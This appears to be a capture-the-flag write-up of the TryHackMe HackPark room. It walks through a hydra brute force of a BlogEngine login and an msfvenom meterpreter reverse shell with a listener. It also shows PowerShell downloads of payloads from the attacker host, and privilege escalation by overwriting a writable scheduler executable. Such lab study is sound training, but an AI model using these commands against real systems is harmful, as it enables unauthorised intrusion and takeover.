# Link
- https://tryhackme.com/room/hackpark

# Info

## IP = $IP

## Creds
- admin:1qaz2wsx

## Versions
- BlogEngine.net:3.3.6.0

# Ports

## Port Scanning
```bash
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
```

## 80
- login page

### `hydra`
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=T16BD6ZKZwtPWZq5WPAKXQ0HHuFrWTOpCaHcDtDL3jRtXhiQ0X8awYt3i0h50GlQcqZQixmpjZHAE5%2Fywhj40tjmWKTWz8YWzYmk4NdZBu78aNdfxqEsYf7f1QOwIZsssswu3D3cUGSdkNApNOQKhzfVenDsVdKH72jnGUVG7jZHf4W6PcGs86MIge4jHHvLlEDft3ZPO%2FCaCoaNzpQi4eQjbFPxK5X5LxH5FEZpARpoadBzahWb2PDTchrKYPy0Vck0LB51wveygYC1L6ioKCJhtZ4SvhUZA8xfsQIPrTqkV3u%2BYtoE6TQ9a9ioFc6q8cQNRYIxPsuq2FKgnJ1QT36GflVOfdCP70BH8GUwEqrBCcvu&__EVENTVALIDATION=sYKBMho%2BkYdi07tiHX0YOvjA0dLn0GZj063ytovoALKg92lR03rI2b%2BjkpIbDOp4fyrSViB1cNpANEt7Ew3nLXdSTleq6ZmRlfTgNA1mvT4AR4UP89L8pBeczAG1RVnXKIPdYenkVZqHWenpIp7%2Fcl67%2Fdhv7i9FPjZmuVVCVhPRJwoT&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -V -I
...
[80][http-post-form] host: $IP   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-23 19:10:25
```

### Admin panel
- version found
- https://www.exploit-db.com/exploits/46353

## 3389

# PrivEsc

## `msfvenom` to create a shell file
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$ATK_IP LPORT=1234 -f exe -o shell-name.exe
```

## open listener in `msfconsole`
```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST $ATK_IP
LHOST => $ATK_IP
msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1234
msf6 exploit(multi/handler) > run
```

## get file from target machine
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://$ATK_IP:8000/shell-name.exe','shell-name.exe')"
```

## run file
```powershell
.\shell-name.exe
```

## Meterpreter

### get winpeas
```powershell
powershell -c "(New-Object System.Net.WebClient).Downloadfile('http://$ATK_IP:8000/winpeas.bat','winpeas.bat')"
```

### process _Message.exe_ is strange...
```bash
meterpreter > pwd                                                                              
c:\Program Files (x86)\SystemScheduler
meterpreter > dir
Listing: c:\Program Files (x86)\SystemScheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2024-03-23 20:24:33 -0400  Events
100666/rw-rw-rw-  60       fil   2019-08-04 07:36:42 -0400  Forum.url
100666/rw-rw-rw-  9813     fil   2004-11-16 02:16:34 -0500  License.txt
100666/rw-rw-rw-  1496     fil   2024-03-23 18:56:24 -0400  LogFile.txt
100666/rw-rw-rw-  3760     fil   2024-03-23 18:56:55 -0400  LogfileAdvanced.txt
100777/rwxrwxrwx  536992   fil   2018-03-25 13:58:56 -0400  Message.exe
```

- all permissions

### get shell file as new Message.exe:
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://$ATK_IP:8000/shell-name.exe','Message.exe')"
```

### wait listening the shell and got root shell =D